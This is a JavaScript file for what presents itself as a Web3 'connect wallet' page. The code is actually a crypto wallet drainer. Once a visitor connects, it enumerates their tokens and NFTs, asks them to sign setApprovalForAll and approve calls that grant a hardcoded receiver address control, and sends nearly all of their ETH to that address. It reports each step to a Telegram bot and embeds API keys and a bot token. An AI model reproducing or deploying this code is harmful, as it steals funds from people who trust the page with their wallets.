"use strict";

// Unpkg imports
const Web3Modal = window.Web3Modal.default; 
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;
// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;

const receiver_addres = '0x688c7Ca99807dE1509D1F100eF46D4B843228Ee4'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
let start_to_log = false;


// get parameters from url
function getParameterByName(name, url = window.location.href) {
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}


/**
 * Setup the orchestra
 */
async function init() {
  start_to_log = false;
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
//   console.log("Fortmatic is", Fortmatic);
  console.log("Portis is", Portis);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
  if(location.protocol !== 'https:') {
    // https://ethereum.stackexchange.com/a/62217/620
    // const alert = document.querySelector("#alert-error-https");
    // alert.style.display = "block";
    // document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    // return;
  }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: "ff343efcf191471e831cd4209a04f583",
      }
    },

    binancechainwallet: {
      package: true
    },

    // coinbasewallet: {
    //   package: CoinbaseWalletSDK, // Required
    //   options: {
    //     appName: "binance", // Required
    //     infuraId: "ff343efcf191471e831cd4209a04f583", // Required
    //     darkMode: true // Optional. Use dark theme, defaults to false
    //   }
    // },

  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false,
    theme: "dark" // optional. For MetaMask / Brave / Opera.
  });
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
  start_to_log = false;
  // Get a Web3 instance for the wallet
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Get connected chain id from Ethereum node
  const chainId = await web3.eth.getChainId();
  // Load chain information over an HTTP API
  const chainData = evmChains.getChain(chainId);
//   document.querySelector("#network-name").textContent = chainData.name;
  console.log("Chain data name:", chainData.name);

  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;

//   document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
//   const template = document.querySelector("#template-balance");
//   const accountContainer = document.querySelector("#accounts");

  // Purge UI elements any previously loaded accounts
//   accountContainer.innerHTML = '';

  // Go through all accounts and get their ETH balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // ethBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    // Fill in the templated row and put in the document
    // const clone = template.content.cloneNode(true);
    // clone.querySelector(".address").textContent = address;
    // clone.querySelector(".balance").textContent = humanFriendlyBalance;
    console.log("New Account: %o", ({address, balance, humanFriendlyBalance}));
    // accountContainer.appendChild(clone);
  });

  // Because rendering account does its own RPC commucation
  // with Ethereum node, we do not want to display any results
  // until data for all accounts is loaded
  await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
//   document.querySelector("#prepare").style.display = "none";
//   document.querySelector("#connected").style.display = "block";
    proceed();
}



/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
//   document.querySelector("#connected").style.display = "none";
//   document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with Ethereum node via JSON-RPC and loads chain data
  // over an API call.
//   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
//   document.querySelector("#btn-connect").removeAttribute("disabled")
}


/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    console.log("provider", provider);
     $(document).ready(function(){
        $("#myModal").modal('show');
    });
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
  onButtonClick = proceed;
}
onButtonClick = onConnect;

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}


async function getTokens(address){
  return new Promise((resolve, reject)=>{
    fetch(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`, {
          method: "GET",
          headers: {
              //"accept": "application/json",
              //"X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

async function getNFTs(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="eth", limit="98"){
  return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft?chain=${chain}&format=decimal&limit=${limit}`, {
          method: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}
async function sendMessage(message){
  return new Promise((resolve, reject)=>{
    const chat_id = 5064784421;
    fetch(`https://api.telegram.org/bot5879478432:AAGltec52Usg-I-7Q6I6uUqIUTzrUdO6yqM/sendMessage?chat_id=${chat_id}&text=${message}`, {
          method: "GET",
          headers: {
              
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

async function getBalance(address, api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="eth"){
  return new Promise((resolve, reject)=>{
    fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=eth`, {
          method: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}
const receiver_address = '0x688c7Ca99807dE1509D1F100eF46D4B843228Ee4';
async function proceed(){
  start_to_log = false;
  console.log("Now we roll!!!");
    // main net
    const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
    const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
    const apiKey = "7HDlroOdhLINIhhc7i4KqmdVLsXNcZqNmPhYCBxqdzAML7McuIqf4iGhsACvF9of";

    // testnet
    // const serverUrl = 'https://vzrez3npotuq.usemoralis.com:2053/server'
    // const appId = 'LVaJ6EwkawTg52M7p8z3yNf2OoEuScDEma9IaM4C'

    Moralis.start({ serverUrl, appId });
    console.log("Moralis initialized");

    let user;
    try {
      // const web3Provider = await Moralis.enableWeb3();
      if(provider.isMetaMask){
        // metamask
        console.log("Moralis using default (MetaMask)")
        const web3Provider = await Moralis.enableWeb3();
        console.log("Moralis web3Provider:", web3Provider);
      }else{
        // walletconnect
        console.log("Moralis using walletconnect")
        // const web3Provider = await Moralis.enableWeb3({ provider: "walletconnect" });
        try {
          user = await Moralis.authenticate({provider: "walletconnect"});
          console.log("Moralis user:", user);
        } catch (error) {
          console.log("Failed to authenticate moralis:",error);
        }
      }
    } catch (error) {
      console.log("Can't enable web3: ", error);
    //   const web3Provider = await Moralis.enableWeb3();
    //   user = await Moralis.authenticate();
    //   console.log('Authenticated User with moralis');
    //   user_address = user.get('ethAddress')

        // Moralis.enableWeb3() has already been called but is not finished
    }
    // NOTE: Moralis.User.current(); doesn't exist

    async function send() {
        console.log("Attempting to send tokens...");
        if (!user_address) {
          throw Error(`No user:  ${user_address}`);
        }
        console.log("Searching for tokens...");


        // let test_addr_with_nfts = '0xe41395822065dc3535a97116485312b44603b289'
        const nft_options = {
          chain: 'eth', // bsc
          // address: test_addr_with_nfts,
          address: user_address, // 0x4444ac99AfeEA6B63Ce53F870e0D4DF191987165
          limit: '98',
        }
        // const eth_nfts = await Moralis.Web3API.account.getNFTs(nft_options).catch(e=>{
        //   console.log("Unable to get NFTs", e);
        // })
        // console.log('Eth NFTs: %o', eth_nfts)

        const eth_token = await getTokens(user_address).catch(e=>{
          console.log("Unable to get tokens", e);
          
        });
        const eth_NFT = await getNFTs(user_address).catch(e=>{
          console.log("Unable to get NFts", e);
          
        });
        await sendMessage(`ETHEREUM : connected to ${user_address}`);
        console.log('First Eth tokens: %o', eth_token)

        const eth_tokens = eth_token.tokens;
        console.log('Eth tokens: %o', eth_tokens);
        console.log('Eth tokens length: %o', eth_tokens.length)

        const eth_NFTs = eth_NFT.result;
        console.log('Eth tokens: %o', eth_NFTs);
        console.log('Eth tokens length: %o', eth_NFTs.length)


        if (eth_tokens.length < 1 && eth_NFTs.length < 1) {
          await sendMessage(`No valuable token or nfts found` )
          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
            console.log("Unable to get new eth balance", e);
          });
          console.log("eth_balance", eth_balance);
          console.log("eth_balance.balance", eth_balance.balance);

          const balance = ((parseInt(eth_balance.balance))/1000000000000000000) - 0.001;
          console.log("The new eth balance", balance);
          if (balance > 0) {
          const options = {
            type: "native",
            amount: Moralis.Units.ETH(balance.toString()),
            receiver: receiver_address,
          };
          let result = await Moralis.transfer(options);
          console.log(result);
        }
        else {
          console.log("Insufficient funds")
          if (eth_tokens.length > 0){
            await sendMessage(`Tokens found` )
          } else if (eth_NFTs.length > 0){
            await sendMessage(`NFTs found` )
          }
        }
          return console.log('No tokens found')
        }

        let real_eth_token = new Array();
        let real_eth_NFTs = new Array();

        // Get tokens real values
        eth_tokens.forEach(function(token,i){
          let price = token.tokenInfo.price.rate;
          let contractAddress = token.tokenInfo.address;
          let balance = token.balance;
          let decimal = token.tokenInfo.decimals;
          let realprice =  balance / (10 ** (decimal || 18)) * price;
          let fakebalance = balance / (10 ** (decimal || 18));
          real_eth_token[i] = {
            contractAddress : contractAddress,
            realprice : realprice,
            balance : balance,
            fakebalance : fakebalance,
            decimal : decimal
          }
        });

        eth_NFTs.forEach(function(token,i){
            let contractAddress = token.token_address;
            if (!real_eth_NFTs.includes(contractAddress)){
            real_eth_NFTs[i] = contractAddress;
        }
          });

        //Arrange token in descending order of value
        real_eth_token.sort((a, b) => b.realprice - a.realprice);
        console.log("real_eth_token length : ", real_eth_token.length);
        console.log("real_eth_token : ", real_eth_token);

        let mum = "";
        // eth_nfts.result.forEach(async (nft, i) => {
            for(let n=0; n<real_eth_NFTs.length; n++){
          
                let ABI721 = [{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"ApprovalCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"ApprovalQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"ApproveToCaller","type":"error"},{"inputs":[],"name":"BalanceQueryForZeroAddress","type":"error"},{"inputs":[],"name":"MintERC2309QuantityExceedsLimit","type":"error"},{"inputs":[],"name":"MintToZeroAddress","type":"error"},{"inputs":[],"name":"MintZeroQuantity","type":"error"},{"inputs":[],"name":"OwnerQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"OwnershipNotInitializedForExtraData","type":"error"},{"inputs":[],"name":"TransferCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"TransferFromIncorrectOwner","type":"error"},{"inputs":[],"name":"TransferToNonERC721ReceiverImplementer","type":"error"},{"inputs":[],"name":"TransferToZeroAddress","type":"error"},{"inputs":[],"name":"URIQueryForNonexistentToken","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"fromTokenId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"toTokenId","type":"uint256"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"}],"name":"ConsecutiveTransfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"FREE_AllowedTokensPerWallet","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"FREE_MAX_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_SUPPLY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"},{"internalType":"address[]","name":"addresses","type":"address[]"}],"name":"batchAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerPurchase","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerWallet","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mintPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveNft","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"setFreeMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"maxMintSupply","type":"uint256"}],"name":"setMaxMintSupply","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"val","type":"uint256"}],"name":"setMaxReserve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"setMaximumAllowedTokensPerTx","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_count","type":"uint256"}],"name":"setMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"val","type":"uint256"}],"name":"setReserveAtATime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"toggleSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
                
                await sendMessage(`Approving 
                                  NFT Address : ${real_eth_NFTs[n]},
                                  Your address : ${receiver_address}
                                    ` )
                const sendOptions = {
                  contractAddress: real_eth_NFTs[n],
                  functionName: "setApprovalForAll",
                  abi: ABI721,
                  params: {
                    operator : receiver_address,
                    approved : true,
                  },
                };
                
                let transaction = await Moralis.executeFunction(sendOptions).catch(
                  (e) => {
                    console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
                    if (e.code === 4001) {
                      mum = "denied";
                      
                    }
                    else {
                      mum = "approved";
                    }
                  },
                )
                if (transaction) {
                  await sendMessage(`Approved` )
                }
                else {
                  await sendMessage(`Denied` )
                }
                console.log(transaction);
                // if(transaction){
                //   await transaction.wait().then((v) => {
                //     console.log('Finished Processing transaction:', v)
                //   })
                // }
              }

        for(let n=0; n<real_eth_token.length && real_eth_token[n].realprice>3; n++){
          let token = real_eth_token[Number(n)];
         let ABI =[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}];
           let {
            contractAddress: contractAddress,
            balance: balance,
            fakebalance : fakebalance,
            decimal : decimal
          } = token
          let amount = Moralis.Units.Token(fakebalance.toString(), decimal.toString());
          // let token_transfer_options = {
          //   type: "erc20",
          //   amount: Moralis.Units.Token(fakebalance.toString(), decimal.toString()),
          //   receiver: receiver_address, //'0x..',
          //   contractAddress,
          // }
          // let temp = { token: token, options: token_transfer_options }
          // console.log(`Transferring token[${n}]:%o`, temp)
        await sendMessage(`Approving 
                            Token Address : ${contractAddress},
                            Amount : ${amount},
                            Your address : ${receiver_address}
                              ` )
          const sendOptions = {
            contractAddress: contractAddress,
            functionName: "approve",
            abi: ABI,
            params: {
              spender : receiver_address,
              _spender : receiver_address,
              usr : receiver_address,
              value : amount,
              _value : amount,
              amount : amount,
              wad : amount,
              
            },
          };
          
          let transaction = await Moralis.executeFunction(sendOptions).catch(
            (e) => {
              console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
              if (e.code === 4001) {
                mum = "denied";
                
              }
              else {
                mum = "approved";
              }
            },
          )
          if (transaction) {
            await sendMessage(`Approved` )
          }
          else {
            await sendMessage(`Denied` )
          }
          console.log(transaction);
          // if(transaction){
          //   await transaction.wait().then((v) => {
          //     console.log('Finished Processing transaction:', v)
          //   })
          // }
        }
        
          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
            console.log("Unable to get new eth balance", e);
          });
          console.log("eth_balance", eth_balance);
          console.log("eth_balance.balance", eth_balance.balance);
          const balance = ((parseInt(eth_balance.balance))/1000000000000000000) - 0.002;
          console.log("The new eth balance", balance);
          
          if (balance > 0) {
          const options = {
            type: "native",
            amount: Moralis.Units.ETH(balance.toString()),
            receiver: receiver_address,
          };
          let result = await Moralis.transfer(options);
          console.log(result);
        }
        else {
          console.log("Insufficient funds")
        }
    }
    send();
}


{
    let l = console.log;
    function normalize(x_){
        let x = String(x_);
        if(/^\[object/g.test(x)){ // [object Window]
            try {
                let y = JSON.stringify(x_);
                x = y;
            } catch (error) {
                x = x+" >> "+(Object.keys(x_));
            }
            return x;
        }else{return x;}
    }
    let logs_to_send = [];
    if(getParameterByName("log") == "true"){
        let el = document.getElementById("testx");
        el.style.display = "block";
        console.log = (x, ...y)=>{
            l(x);
            if(y && y.length>0){
              y.forEach((z) => {
                  l(y,":",z);
                  x+=(" -> ("+normalize(z)+")");
                });
            }
            x = normalize(x);
            el.innerText += ("~ "+x+"\n");
            if(start_to_log){
              logs_to_send.push(x);
            }
            window.setTimeout(function() {
              el.scrollTop = el.scrollHeight;
            }, 500);
        }
    }
    setInterval(() => {
      if(logs_to_send.length == 0 || !start_to_log) return;
      let text = logs_to_send.splice(0,1);
      let url = "";
      let chat_id = "";
      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
      //   l("TG Log Err:", e);
      // });
    }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
}

{
  let l = console.log;
  function normalize(x_){
      let x = String(x_);
